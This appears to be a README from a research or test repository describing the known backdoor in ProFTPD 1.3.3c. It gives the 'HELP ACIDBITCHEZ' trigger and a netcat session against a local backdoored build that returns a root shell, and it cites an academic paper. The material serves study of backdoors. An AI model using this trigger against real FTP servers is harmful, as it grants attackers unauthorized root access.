# ProFTPD 1.3.3c backdoor
- **Type**: hidden command
- **Affected versions**: 1.3.3c


## Backdoor
Running the FTP command `"HELP"` with the argument `"ACIDBITCHEZ"` spawns a root shell, in which
arbitrary commands can be executed.

## Triggering the backdoor
First, we need to start up the FTP server (e.g., with the _backdoored_ variant):
```console
$ ./backdoored/proftpd -n -c $PWD/proftpd.conf
```
In a separate terminal, we can trigger the backdoor:
```console
$ nc localhost 21  # connect to the FTP server
220 ProFTPD 1.3.3c Server (ProFTPD Default Installation) [::ffff:127.0.0.1]
HELP ACIDBITCHEZ
id
uid=0(root) gid=0(root) groups=0(root)
exit
502 Unknown command 'ACIDBITCHEZ'
QUIT
221 Goodbye.
```


## Reference
<https://doi.org/10.1145/2508859.2516716>
